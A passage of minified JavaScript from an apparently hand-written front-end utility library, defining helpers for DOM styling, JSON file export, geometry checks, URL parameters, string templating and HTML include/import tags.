this.mouseEnable=i,this.mouseEnable__ID=function(t){i(window.document.getElementById(t))},this.switch_CSS_Display=function(t){""==this.getDisplay(t)?this.setDisplay_None(t):"none"==this.getDisplay(t)&&this.setDisplay_Null(t)},this.setBottom_Percent=function(t,e){t.style.bottom=e+"%"},this.setDisplay_Block=function(t){this.setDisplay(t,"block")},this.setDisplay_Inline=function(t){this.setDisplay(t,"inline")},this.setDisplay_Inherit=function(t){this.setDisplay(t,"inherit")},this.setDisplay_None=function(t){this.setDisplay(t,"none")},this.setDisplay_Null=function(t){this.setDisplay(t,"")},this.setHeight_Percent=function(t,e){t.style.height=e+"%"},this.setLeft_Percent=function(t,e){t.style.left=e+"%"},this.setRight_Percent=function(t,e){t.style.right=e+"%"},this.setSize_Percent100=function(t){var e=window.Lib.Ttw.fnDisObj;e.setHeight_Percent(t,100),e.setWidth_Percent(t,100)},this.setSizeFromScrollSize=function(t){t.height=t.scrollHeight,t.width=t.scrollWidth},this.setTop_Percent=function(t,e){t.style.top=e+"%"},this.setVisiblity_Collapse=function(t){this.setVisiblity(t,"collapse")},this.setVisiblity_Hidden=function(t){this.setVisiblity(t,"hidden")},this.setVisiblity_Inherit=function(t){this.setVisiblity(t,"inherit")},this.setVisiblity_Null=function(t){this.setVisiblity(t,"")},this.setVisiblity_Visible=function(t){this.setVisiblity(t,"visible")},this.setWidth_Percent=function(t,e){t.style.width=e+"%"},this.getBottom=function(t){return w.parseFloat(t.style.bottom.replace("px",""))},this.setBottom=function(t,e){t.style.bottom=e+"px"},this.getDisplay=function(t){return t.style.display},this.setDisplay=function(t,e){t.style.display=e},this.getHeight=function(t){return w.parseFloat(t.style.height.replace("px",""))},this.setHeight=function(t,e){t.style.height=e+"px"},this.getLeft=function(t){return w.parseFloat(t.style.left.replace("px",""))},this.setLeft=function(t,e){t.style.left=e+"px"},this.getRight=function(t){return w.parseFloat(t.style.right.replace("px",""))},this.setRight=function(t,e){t.style.right=e+"px"},this.getTop=function(t){return w.parseFloat(t.style.top.replace("px",""))},this.setTop=function(t,e){t.style.top=e+"px"},this.getVisiblity=function(t){return t.style.visiblity},this.setVisiblity=function(t,e){t.style.visiblity=e},this.getWidth=function(t){return w.parseFloat(t.style.width.replace("px",""))},this.setWidth=function(t,e){t.style.width=e+"px"},this.getX=function(t){return w.parseFloat(t.style.paddingLeft.replace("px",""))},this.setX=function(t,e){t.style.paddingLeft=e+"px"},this.getY=function(t){return w.parseFloat(t.style.paddingTop.replace("px",""))},this.setY=function(t,e){t.style.paddingTop=e+"px"},this},lt.CLASS.FN.DisObjContainer=function(){},lt.CLASS.FN.Draw=function(){},lt.CLASS.FN.Effect=function(){},lt.CLASS.FN.Event=function(t){},lt.CLASS.FN.EventKeyboard=function(t){},lt.CLASS.FN.EventMouse=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnEventMouse",this["package"]="global.Lib.Ttw.CLASS.FN.EventMouse"},lt.CLASS.FN.File=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnFile";var e=lt.singleton(t.instanceKey,null);if(e)return e;this["package"]="global.Lib.Ttw.CLASS.FN.File";var n=function(t,e){return new Blob([s(t)],d(e))},r=function(t,e){return new Blob([u(t)],d(e))},i=function(t,e,r){var i=window.document.getElementById(r);i.href=URL.createObjectURL(n(e)),i.download=t,i.click()},a=function(t,e,n){var i=window.document.getElementById(n);i.href=URL.createObjectURL(r(e)),i.download=t,i.click()},o=function(t){var e=new Blob([t],{type:"text/plain"});window.open(URL.createObjectURL(e))},l=function(t){window.open("data:text/json;charset=utf-8,"+s(t))},c=function(t){window.open("data:text/json;charset=utf-8,"+u(t))},s=function(t){return"string"==typeof t?t:JSON.stringify(t)},u=function(t){return"string"==typeof t?JSON.stringify(JSON.parse(t),null,"	"):JSON.stringify(t,null,"	")},_=function(t){return t||"text/plain"},d=function(t){return{type:_(t)}};return this.export_A__JSONToFile=function(t,e,n){i(t,e,n)},this.export_A__JSONToFile__Arrange=function(t,e,n){a(t,e,n)},this.export_W_Open__JSONToFile=o,this.export_W_Open__JSONObjToFile=l,this.export_W_Open__JSONObjToFile__Arrange=c,this},lt.CLASS.FN.Flash=function(t){},lt.CLASS.FN.Geometry=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnGeom";var e=lt.singleton(t.instanceKey,null);return e?e:(this["package"]="global.Lib.Ttw.CLASS.FN.Geometry",this.checkContains__RP=function(t,e,n,r,i,a){return i>t&&n>i&&a>e&&r>a?!0:!1},this.checkContains__RR=function(t,e,n,r,i,a,o,l){var c=this.checkContains__RP;return 4==c(t,e,n,r,i,a)+c(t,e,n,r,i,l)+c(t,e,n,r,o,a)+c(t,e,n,r,o,l)?!0:!1},this.checkContains__RR_Both=function(t,e,n,r,i,a,o,l){var c=this.checkContains__RP;return 4==c(t,e,n,r,i,a)+c(t,e,n,r,i,l)+c(t,e,n,r,o,a)+c(t,e,n,r,o,l)?!0:4==c(i,a,o,l,t,e)+c(i,a,o,l,t,r)+c(i,a,o,l,n,e)+c(i,a,o,l,n,r)?!0:!1},this.checkContainsEqual__RP=function(t,e,n,r,i,a){return i>=t&&n>=i&&a>=e&&r>=a?!0:!1},this.checkContainsEqual__RR=function(t,e,n,r,i,a,o,l){var c=this.checkContainsEqual__RP;return 4==c(t,e,n,r,i,a)+c(t,e,n,r,i,l)+c(t,e,n,r,o,a)+c(t,e,n,r,o,l)?!0:!1},this.checkContainsEqual__RR_Both=function(t,e,n,r,i,a,o,l){var c=this.checkContainsEqual__RP;return 4==c(t,e,n,r,i,a)+c(t,e,n,r,i,l)+c(t,e,n,r,o,a)+c(t,e,n,r,o,l)?!0:4==c(i,a,o,l,t,e)+c(i,a,o,l,t,r)+c(i,a,o,l,n,a)+c(i,a,o,l,n,r)?!0:!1},this.checkDisjoint__RP=function(t,e,n,r,i,a){return i>=t&&n>=i&&a>=e&&r>=a?!1:!0},this.checkDisjoint__RR=function(t,e,n,r,i,a,o,l){var c=this.checkContains__RP,s=c(t,e,n,r,i,a)+c(t,e,n,r,i,l)+c(t,e,n,r,o,a)+c(t,e,n,r,o,l);return s?!1:!0},this.checkEqual__RP=function(t,e,n,r,i,a){return t==i&&e==a?!0:n==i&&r==a?!0:!1},this.checkEqual__RR=function(t,e,n,r,i,a,o,l){return t==i&&e==a&&n==o&&r==l?!0:!1},this.checkIntersect__RP=function(t,e,n,r,i,a){},this.checkIntersect__RR=function(t,e,n,r,i,a,o,l){},this.checkOverlaps__RP=function(t,e,n,r,i,a){return i>=t&&n>=i&&a>=e&&r>=a?!0:!1},this.checkOverlaps__RR=function(t,e,n,r,i,a,o,l){var c=this.checkOverlaps__RP;return c(t,e,n,r,i,a)?!0:c(t,e,n,r,i,l)?!0:c(t,e,n,r,o,a)?!0:c(t,e,n,r,o,l)?!0:!1},this.checkTouch__RP=function(t,e,n,r,i,a){},this.checkTouch__RR=function(t,e,n,r,i,a,o,l){},this.checkOverlaps__RR_Both=function(t,e,n,r,i,a,o,l){var c=this.checkOverlaps__RP;return c(t,e,n,r,i,a)?!0:c(t,e,n,r,i,l)?!0:c(t,e,n,r,o,a)?!0:c(t,e,n,r,o,l)?!0:this.checkOverlaps__RR(i,a,o,l,t,e,n,r)},this.checkTouch__RP=function(t,e,n,r,i,a){},this.checkTouch__RR=function(t,e,n,r,i,a,o,l){},void(this.getMinMaxXY=function(t,e,n,r){var i=[];return t>n?(i[0]=n,i[2]=t):(i[0]=t,i[2]=n),e>r?(i[1]=r,i[3]=e):(i[1]=e,i[3]=r),i}))},lt.CLASS.FN.HTML=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnHTML";var e=lt.singleton(t.instanceKey,null);if(e)return e;var n=this;this["package"]="global.Lib.Ttw.CLASS.FN.HTML",this.sJSControllerNameForHTMLElement="js";var r=function(t){var e=t.getElementsByTagName("import-html"),r=e.length;if(r)for(var i,a,o,l=STtwUtilTemplateHTML.replaceHTMLJS__URLToEl_Return,c=STtwUtilTemplateHTML.replaceHTMLJSCSS__URLToEl_Return,c=STtwUtilTemplateHTML.replaceHTML__URLToEl,s=0;r>s;++s){o=e[0];var u=o.parentElement,_=o.getAttribute("url_js"),d=o.getAttribute("url_css");i=d?c(o.innerText,_,d,u,o):l(o.innerText,_,u,o),a=i[0],a[n.sJSControllerNameForHTMLElement]=i[1],a.setAttribute("class",o.getAttribute("class")+" import-html"),a.__isImportTag=1,o.innerHTML=null,o=null}return t};this.importHTML=function(t){return r(t)};var i=function(t){return r(window.document.getElementById(t))};this.importHTML__ElID=function(t){return i(t)};var a=function(t){var e=t.getElementsByTagName("import-html"),r=e.length;if(r){for(var i,o,l,c=STtwUtilTemplateHTML.replaceHTMLJS__URLToEl_Return,s=STtwUtilTemplateHTML.replaceHTMLJSCSS__URLToEl_Return,u=0;r>u;++u){l=e[0],p=l.parentElement;var _=l.getAttribute("url_js"),d=l.getAttribute("url_css");i=d?s(l.innerText,_,d,p,l):c(l.innerText,_,p,l),o=i[0],o[n.sJSControllerNameForHTMLElement]=i[1],o.setAttribute("class",l.getAttribute("class")+" import-html"),o.__isImportTag=1,l.innerHTML=null,l=null}a(t)}return t};this.importHTML_Recursion=function(t){return a(t)};var o=function(t){return a(window.document.getElementById(t))};this.importHTML__ELID_Recursion=function(t){return o(t)};var l=function(t){t.__originalInnerHTML||(t.__originalInnerHTML=t.innerHTML);for(var e,n=t.innerHTML,r=t.getElementsByTagName("include-html"),i=0,a=r.length;a>i;++i)e=r[i],n=n.replace("<include-html>"+e.innerText+"</include-html>",STtwUtilXMLHttpReqGet.reqSyncReturnResponstText__Cache(e.innerText));return t.innerHTML=n,t};this.includeHTML=function(t){return l(t)};var c=function(t){return l(window.document.getElementById(t))};this.includeHTML__ElID=function(t){return c(t)};var s=function(t){t.__originalInnerHTML||(t.__originalInnerHTML=t.innerHTML);var e=t.innerHTML,n=t.getElementsByTagName("include-html"),r=n.length;if(r){for(var i,a=0;r>a;++a)i=n[a],e=e.replace("<include-html>"+i.innerText+"</include-html>",STtwUtilXMLHttpReqGet.reqSyncReturnResponstText__Cache(i.innerText));t.innerHTML=e,s(t)}return t};this.includeHTML_Recursion=function(t){return s(t)};var u=function(t){return s(window.document.getElementById(t))};this.includeHTML__ELID_Recursion=function(t){return u(t)};var _=function(t){var e=t.getElementsByTagName("replace-html"),r=e.length;if(r)for(var i,a,o,l=(STtwUtilTemplateHTML.replaceHTMLJS__URLToEl_Return,STtwUtilTemplateHTML.replaceHTMLJSCSS__URLToEl_Return,Lib.Ttw.eval),c=0;r>c;++c){o=e[0];o.parentElement;i=l(o.innerText+"()"),a=i[0],a[n.sJSControllerNameForHTMLElement]=i[1],a.setAttribute("class",o.getAttribute("class")+" import-html"),a.__isReplaceTag=1,o.innerHTML=null,o=null}return t};this.replaceHTML=function(t){return _(t)};var d=function(t){return _(window.document.getElementById(t))};this.replaceHTML__ElID=function(t){return d(t)};var h=function(t){var e=t.getElementsByTagName("replace-html"),r=e.length;if(r){for(var i,a,o,l=(STtwUtilTemplateHTML.replaceHTMLJS__URLToEl_Return,STtwUtilTemplateHTML.replaceHTMLJSCSS__URLToEl_Return,Lib.Ttw.eval),c=0;r>c;++c)o=e[0],p=o.parentElement,i=l(o.innerText+"()"),a=i[0],a[n.sJSControllerNameForHTMLElement]=i[1],o.parentElement.replaceChild(a,o),a.setAttribute("class",o.getAttribute("class")+" import-html"),a.__isReplaceTag=1,o.innerHTML=null,o=null;h(t)}return t};this.replaceHTML_Recursion=function(t){return h(t)};var f=function(t){return h(window.document.getElementById(t))};this.replaceHTML__ELID_Recursion=function(t){return f(t)}},lt.CLASS.FN.Location=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnLocation";var e=lt.singleton(t.instanceKey,null);if(e)return e;this["package"]="global.Lib.Ttw.CLASS.FN.Location",window.TtwLog.timeStamp("------[ S ] - "+this["package"]+"():"+this["package"]);var n=function(t){for(var e,n,r=[],i=decodeURI(window.location.href,"UTF-8"),a=i.slice(i.indexOf("?")+1,i.length).split("&"),o=0,l=a.length;l>o;++o)e=a[o],n=e.split("="),r[o]=[n[0],n[1]];return r};this.getArrayFromParamters=function(t){return n(t)};var r=function(){for(var t,e,n={},r=decodeURI(window.location.href,"UTF-8"),i=r.slice(r.indexOf("?")+1,r.length).split("&"),a=0,o=i.length;o>a;++a)t=i[a],e=t.split("="),n[e[0]]=e[1];return n};this.getObjectFromParamters=function(){return r()};var i=function(t){for(var e,n,r="",i=decodeURI(global.location.href,"UTF-8"),a=i.slice(i.indexOf("?")+1,i.length).split("&"),o=0,l=a.length;l>o;++o){e=a[o],n=e.split("=");var c=n[0];if(c==t){r=n[1];break}}return r};this.getParameter__Name=function(t){return i(t)},window.TtwLog.timeStamp("------[ E ] - "+this["package"]+"():"+this["package"])},lt.CLASS.FN.Math=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnMath";var e=lt.singleton(t.instanceKey,null);return e?e:(this["package"]="global.Lib.Ttw.CLASS.FN.Math",this._aUniqueIDs=[],this.ceil=function(t,e){return e=e||1,Math.ceil(t/e)*e},this.floor=function(t,e){return e=e||1,Math.floor(t/e)*e},this.isUnique=function(t){var e;for(e in this._aUniqueIDs)if(this._aUniqueIDs[e]==t)return!1;return!0},this.random=function(t,e,n){if(e=e||0,n=n||1,t>e){var r=t;t=e,e=r}var i=e-t+1*n,a=Math.random()*i;return a+=t,this.floor(a,n)},this.round=function(t,e){return e=e||1,Math.round(t/e)*e},void(this.getUnique=function(){null==this._aUniqueIDs&&(this._aUniqueIDs=[]);for(var t=new Date,e=t.getTime();!this.isUnique(e);)e+=this.random(t.getTime(),2*t.getTime());return this._aUniqueIDs.push(e),e}))},lt.CLASS.FN.Matrix=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnMatrix";var e=lt.singleton(t.instanceKey,null);return e?e:void(this["package"]="global.Lib.Ttw.CLASS.FN.Matrix")},lt.CLASS.FN.JSON=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnJSON";var e=lt.singleton(t.instanceKey,null);if(e)return e;this["package"]="global.Lib.Ttw.fnJSON";var n=function(t){try{return JSON.stringify(t,Object.keys(t).sort())}catch(e){global.TtwLog.error("Object 속성의 값이 JSON에 위배됩니다.")}};this.sort_properties__Object__returnString=function(t){return n(t)},this.sort_properties__Object__returnObject=function(t){return JSON.parse(n(t))},this.sort_properties__JSONObject__returnString=function(t){return n(JSON.parse(t))},this.sort_properties__JSONObject__returnObject=function(t){return JSON.parse(n(JSON.parse(t)))};var r=function(t){for(var e="["+n(t[0]),r=1,i=t.length;i>r;++r)e+=","+n(t[r]);return e};this.sort_properties__Array__returnString=function(t){return r(t)},this.sort_properties__Array__returnObject=function(t){return JSON.parse(r(t))},this.sort_properties__JSONArray__returnString=function(t){return r(JSON.parse(t))},this.sort_properties__JSONArray__returnObject=function(t){return JSON.parse(r(JSON.parse(t)))}},lt.CLASS.FN.Object=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnObject";var e=lt.singleton(t.instanceKey,null);if(e)return e;this["package"]="global.Lib.Ttw.fnObject",this.copyObjectRef=function(t,e){for(var n in e)t[n]=e[n]},this.deepExtend=function(){if(arguments.length<1||"object"!=typeof arguments[0])return!1;if(arguments.length<2)return arguments[0];var t,e,n,r,i,a=arguments[0],o=Array.prototype.slice.call(arguments,1);return o.forEach(function(o){if("object"==typeof o)for(t in o)n=a[t],e=o[t],e!==a&&("object"==typeof e&&null!==e?e instanceof Buffer?(i=new Buffer(e.length),e.copy(i),a[t]=i):e instanceof Date?a[t]=new Date(e.getTime()):e instanceof RegExp?a[t]=new RegExp(e):"object"==typeof n&&null!==n?(r=Array.isArray(e)?Array.isArray(n)?n:[]:Array.isArray(n)?{}:n,a[t]=STtwUtilObject.deepExtend(r,e)):(r=Array.isArray(e)?[]:{},a[t]=STtwUtilObject.deepExtend(r,e)):a[t]=e)}),a};var n=function(t,e){var n,r=[];for(var i in t)n=t[i],n==e&&r.push(i)};this.searchSameObject=function(t,e){n(t,e)};var r=function(t,e){var n,r=[];for(var i in t){n=t[i];for(var a in e)try{n==e[a]&&r.push([i,a])}catch(o){}}};this.searchSameProperties=function(t,e){r(t,e)};var i=function(t,e){var n;if(t[e])return t[e];if(e.indexOf(".")>-1){var r=e.split("."),i=t[r[0]];if(void 0==i)return null;for(var a=1,o=r.length;o>a;++a)i=i[r[a]];return n=i}return t[e]};this.getValueFromKey_dotKeyRef=function(t,e){return i(t,e)}},lt.CLASS.FN.String=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnString";var e=lt.singleton(t.instanceKey,null);if(e)return e;this["package"]="global.Lib.Ttw.fnString";var n=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=l(t),o=0,c=e.length;c>o;++o){n=e[o];for(var s,u=t,_=0,d=a.length;d>_;++_)s=r(n,a[_]),void 0!=s&&(u=u.replace("{{"+a[_]+"}}",s));i+=u}return i};this.applyStrFromArray=function(t,e){return n(t,e)};var r=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=l(t),o=0,c=e.length;c>o;++o){n=e[o];for(var s,u=t,_=0,d=a.length;d>_;++_)s=r(n,a[_]),void 0!=s&&(u=u.replace("{{"+a[_]+"}}",s));i+=u}return i};this.applyStrFromArray__NV_NA=function(t,e){return r(t,e)};var i=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=l(t),o=t,c=0,s=a.length;s>c;++c)n=r(e,a[c]),void 0!=n&&(o=o.replace("{{"+a[c]+"}}",n));return i+=o};this.applyStrFromObj=function(t,e){return i(t,e)};var a=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=l(t),o=t,c=0,s=a.length;s>c;++c)n=r(e,a[c]),void 0!=n&&(o=o.replace("{{"+a[c]+"}}",n));return i+=o};this.applyStrFromObj__NV_NA=function(t,e){return a(t,e)};var o=function(t){var e=t.s.indexOf("{{"),n=t.s.indexOf("}}"),r=t.s.slice(e,n+2);return t.s=t.s.replace(r,""),r.replace("{{","").replace("}}","")},l=function(t){for(var e=[],n={s:t};n.s.indexOf("{{")>-1;)e.push(o(n));return e};this.extraction_applyStr=function(t){return l(t)};var c=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=h(t),o=0,l=e.length;l>o;++o){n=e[o];for(var c,s=t,u=0,_=a.length;_>u;++u)c=r(n,a[u]),void 0!=c&&(s=s.replace("{{"+a[u]+"}}",c));i+=s}return i};this.applyBraceStrFromArray=function(t,e){return c(t,e)};var s=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=h(t),o=0,l=e.length;l>o;++o){n=e[o];for(var c,s=t,u=0,_=a.length;_>u;++u)c=r(n,a[u]),void 0!=c&&(s=s.replace("{{"+a[u]+"}}",c));i+=s}return i};this.applyBraceStrFromArray__NV_NA=function(t,e){return s(t,e)};var u=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=h(t),o=t,l=0,c=a.length;c>l;++l)n=r(e,a[l]),void 0!=n&&(o=o.replace("{{"+a[l]+"}}",n));return i+=o};this.applyBraceStrFromObj=function(t,e){return u(t,e)};var _=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=h(t),o=t,l=0,c=a.length;c>l;++l)n=r(e,a[l]),void 0!=n&&(o=o.replace("{{"+a[l]+"}}",n));return i+=o};this.applyBraceStrFromObj__NV_NA=function(t,e){return _(t,e)};var d=function(t){var e=t.s.indexOf("{{"),n=t.s.indexOf("}}"),r=t.s.slice(e,n+2);return t.s=t.s.replace(r,""),r.replace("{{","").replace("}}","")},h=function(t){for(var e=[],n={s:t};n.s.indexOf("{{")>-1;)e.push(d(n));return e};this.extraction_applyBraceStr=function(t){return h(t)};var f=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=m(t),o=0,l=e.length;l>o;++o){n=e[o];for(var c,s=t,u=0,_=a.length;_>u;++u)c=r(n,a[u]),void 0!=c&&(s=s.replace("[["+a[u]+"]]",c));i+=s}return i};this.applyBracketsStrFromArray=function(t,e){return f(t,e)};var T=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=m(t),o=0,l=e.length;l>o;++o){n=e[o];for(var c,s=t,u=0,_=a.length;_>u;++u)c=r(n,a[u]),void 0!=c&&(s=s.replace("[["+a[u]+"]]",c));i+=s}return i};this.applyBracketsStrFromArray__NV_NA=function(t,e){return T(t,e)};var L=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=m(t),o=t,l=0,c=a.length;c>l;++l)n=r(e,a[l]),void 0!=n&&(o=o.replace("[["+a[l]+"]]",n));return i+=o};this.applyBracketsStrFromObj=function(t,e){return L(t,e)};var p=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=m(t),o=t,l=0,c=a.length;c>l;++l)n=r(e,a[l]),void 0!=n&&(o=o.replace("[["+a[l]+"]]",n));return i+=o};this.applyBracketsStrFromObj__NV_NA=function(t,e){return p(t,e)};var S=function(t,e){var n=p,r=S;if(-1!=t.outerHTML.indexOf("{{")){var i,a=t.children,o=a.length;if(o)for(var l,c=0;o>c;++c)l=a[c],l.__isImportTag?-1!=l.outerHTML.indexOf("{{")&&(l=l.getElementsByClassName("import-html").length?r(l,e):r(l,e),global.TtwLog.error("undefined This Element's value - "+l.outerHTML)):-1!=l.outerHTML.indexOf("{{")&&(l=l.getElementsByClassName("import-html").length?r(l,e):r(l,e));else i=n(t.outerHTML,e),i&&(t.outerHTML=i)}return t};this.applyBracketsStrFromObj__NV_NA__El_Children=function(t,e){return S(t,e)};var g=function(t){var e=t.s.indexOf("[["),n=t.s.indexOf("]]"),r=t.s.slice(e,n+2);return t.s=t.s.replace(r,""),r.replace("[[","").replace("]]","")},m=function(t){for(var e=[],n={s:t};n.s.indexOf("[[")>-1;)e.push(g(n));return e};this.extraction_applyBracketsStr=function(t){return m(t)};var y=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=b(t),o=0,l=e.length;l>o;++o){n=e[o];for(var c,s=t,u=0,_=a.length;_>u;++u)c=r(n,a[u]),void 0!=c&&(s=s.replace("(("+a[u]+"))",c));i+=s}return i};this.applyParenthesesStrFromArray=function(t,e){return y(t,e)};var w=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i="",a=b(t),o=0,l=e.length;l>o;++o){n=e[o];for(var c,s=t,u=0,_=a.length;_>u;++u)c=r(n,a[u]),void 0!=c&&(s=s.replace("(("+a[u]+"))",c));i+=s}return i};this.applyParenthesesStrFromArray__NV_NA=function(t,e){return w(t,e)};var v=function(t,e){var n=STtwUtilObject.getValueFromKey_dotKeyRef,r="",i=b(t),a=i.length;if(a){for(var o,l=t,c=0;a>c;++c)o=n(e,i[c]),void 0!=o&&(l=l.replace("(("+i[c]+"))",o));return r+=l}return null};this.applyParenthesesStrFromObj=function(t,e){return v(t,e)};var M=function(t,e){var n=STtwUtilObject.getValueFromKey_dotKeyRef,r="",i=b(t),a=i.length;if(a){for(var o,l=t,c=0;a>c;++c)o=n(e,i[c]),void 0!=o&&(l=l.replace("(("+i[c]+"))",o));return r+=l}return null};this.applyParenthesesStrFromObj__NV_NA=function(t,e){return M(t,e)};var R=function(t,e){for(var n,r=STtwUtilObject.getValueFromKey_dotKeyRef,i=b(t.innerHTML),a=0,o=i.length;o>a;++a)n=r(e,i[a]),void 0!=n&&(t.innerHTML=t.innerHTML.replace("(("+i[a]+"))",n))};this.applyParenthesesStrFromObj__NV_NA__El=function(t,e){return R(t,e)};var C=function(t,e){var n=M,r=C;if(-1!=t.outerHTML.indexOf("((")){var i,a=t.children,o=a.length;if(o)for(var l,c=0;o>c;++c)l=a[c],l.__isImportTag?-1!=l.outerHTML.indexOf("((")&&(l=l.getElementsByClassName("import-html").length?r(l,e):r(l,e),global.TtwLog.error("undefined This Element's label - "+l.outerHTML)):-1!=l.outerHTML.indexOf("((")&&(l=l.getElementsByClassName("import-html").length?r(l,e):r(l,e));else i=n(t.outerHTML,e),i&&(t.outerHTML=i)}return t};this.applyParenthesesStrFromObj__NV_NA__El_Children=function(t,e){return C(t,e)};var E=function(t){var e=t.s.indexOf("(("),n=t.s.indexOf("))"),r=t.s.slice(e,n+2);return t.s=t.s.replace(r,""),r.replace("((","").replace("))","")},b=function(t){for(var e=[],n={s:t};n.s.indexOf("((")>-1;)e.push(E(n));return e};this.extraction_applyParenthesesStr=function(t){return b(t)};var H=function(t){var e=t.s.indexOf("<include-html>"),n=t.s.indexOf("</include-html>"),r=t.s.slice(e,n+15);return t.s=t.s.replace(r,""),r.replace("<include-html>","").replace("</include-html>","")},U=function(t){for(var e=[],n={s:t};n.s.indexOf("<include-html>")>-1;)e.push(H(n));return e};this.extraction_applyHTMLStr=function(t){return U(t)};var A=function(t){var e=U(t),n=e.length;if(n){for(var r,i=t,a=0;n>a;++a)r=e[a],i=i.replace("<include-html>"+r+"</include-html>",STtwUtilXMLHttpReqGet.reqSyncReturnResponstText__Cache(r));return i}return t};this.includeHTML=function(t){return A(t)};var O=function(t){var e=U(t),n=e.length;if(n){for(var r,i=t,a=0;n>a;++a)r=e[a],i=i.replace("<include-html>"+r+"</include-html>",STtwUtilXMLHttpReqGet.reqSyncReturnResponstText__Cache(r));return i=O(i)}return t};this.includeHTML_Recursion=function(t){return O(t)}},lt.CLASS.FN.TemplateHTML=function(d){this.instanceKey=d.instanceKey||"global.Lib.Ttw.fnTemplateHTML";var t=lt.singleton(d.instanceKey,null);if(t)return t;this["package"]="global.Lib.Ttw.CLASS.FN.TemplateHTML";var _dictionary__addCSS={},_dictionary__addHTML={},_dictionary__addJS={},_tempDOM_DIV__Sync=window.document.createElement("DIV"),_tempDOM_TABLE__Sync=window.document.createElement("TABLE"),_tempDOM_TBODY__Sync=window.document.createElement("TBODY"),_tempDOM_THEAD__Sync=window.document.createElement("THEAD"),_tempDOM_UL__Sync=window.document.createElement("UL"),_regExp_newline0=/\n/gi,_regExp_space0=/\ /gi,_regExp_tab0=/\t/gi,_addCache=function(t,e,n){t[e]=n},_checkCache=function(t,e){return t[e]?!0:!1},_checkCache__Alert=function(t,e,n){var r=_checkCache(t,e,n);return r&&alert(n+" Cache - "+e+" is "+r),r},_addCSSText=function(t,e){var n=_createHTML_STYLE(t);n.__style__dynamic=1,e.appendChild(n)};this.addCSSText=function(t,e){return _addCSSText(t,e)};var _addCSSText_name=function(t,e,n){var r=_createHTML_STYLE(t);r.__style__dynamic=n,e.appendChild(r)};this.addCSSText_name=function(t,e,n){return _addCSSText_name(t,e,n)};var _removeAllStyleElements=function(t){for(var e,n=t.children,r=0,i=n.length;i>r;++r)e=n[r],"STYLE"==e.tagName&&(e.innerText="",t.removeChild(e))};this.removeAllStyleElements=function(t){_removeAllStyleElements(t)};var _removeAllStyleElements_name=function(t,e){for(var n,r=[],i=t.children,a=0,o=i.length;o>a;++a){n=i[a];var l;try{l=n.__style__dynamic}catch(c){}l&&"STYLE"==n.tagName&&-1!=l.indexOf(e)&&r.push(n)}for(a=0,o=r.length;o>a;++a)r[a].innerText="",t.removeChild(r[a])};this.removeAllStyleElements_name=function(t,e){_removeAllStyleElements_name(t,e)};var _removeAllStyleElements__style_dynamic=function(t){for(var e,n=t.children,i=0,a=n.length;a>i;++i){e=n[i];var o;try{o=e.__style__dynamic}catch(l){}o&&"STYLE"==e.tagName&&e.haswOwnProperty("__style_dynamic_")&&r.push(e)}for(i=0,a=r.length;a>i;++i)r[i].innerText="",t.removeChild(r[i])};this.removeAllStyleElements__style_dynamic=function(t){_removeAllStyleElements__style_dynamic(t)};var _removeStyleElement=function(t,e){for(var n,r=t.children,i=0,a=r.length;a>i;++i){n=r[i];var o;try{o=n.__style__dynamic}catch(l){}if(o&&"STYLE"==n.tagName&&e==o)return n.innerText="",t.removeChild(n)}};this.removeStyleElement=function(t,e){return _removeStyleElement(t,e)};var addCSS__URLToHead=function(t){try{window.document.head.appendChild(arguments.callee.owner.createCSS_LINK(t))}catch(e){window.document.getElementsByTagName("head")[0].appendChild(arguments.callee.owner.createCSS_LINK(t))}},addHTML__URLToEl=function(t,e){var n=arguments.callee.owner.createHTML(reqSyncReturnHTMLText(t));return n.__URL_HTML=t.replace(_regExp_newline0,"").replace(_regExp_space0,"").replace(_regExp_tab0,""),e.appendChild(n),STtwUtilDisObj.mouseEnable(n),n},addHTML__URLToEl_Cache=function(t,e){STtwUtilTemplateHTML.checkCache_HTML(t)||_addCache(_dictionary__addHTML,t,reqSyncReturnHTMLText(t));var n=arguments.callee.owner.createHTML(_dictionary__addHTML[t]);return n.__URL_HTML=t.replace(_regExp_newline0,"").replace(_regExp_space0,"").replace(_regExp_tab0,""),e.appendChild(n),STtwUtilDisObj.mouseEnable(n),n},addHTML__URLToElID=function(t,e){return addHTML__URLToEl(t,window.document.getElementById(e))},addHTML__URLToElID_Cache=function(t,e){return addHTML__URLToEl_Cache(t,window.document.getElementById(e))};this.addHTMLJS__URL=function(t,e,n){var r=addHTML__URLToElID(t,n);return STtwUtilTemplateHTML.addJS__URL(e),r},this.addHTMLJS__URL_Cache=function(t,e,n){var r=addHTML__URLToElID_Cache(t,n);return STtwUtilTemplateHTML.addJS__URL_Cache(e),r},this.addHTMLJS__URL_Return=function(t,e,n){var r=addHTML__URLToElID(t,n),i=STtwUtilTemplateHTML.addJS__URL(e,r);return[r,i]},this.addHTMLJS__URL_Return_Cache=function(t,e,n){var 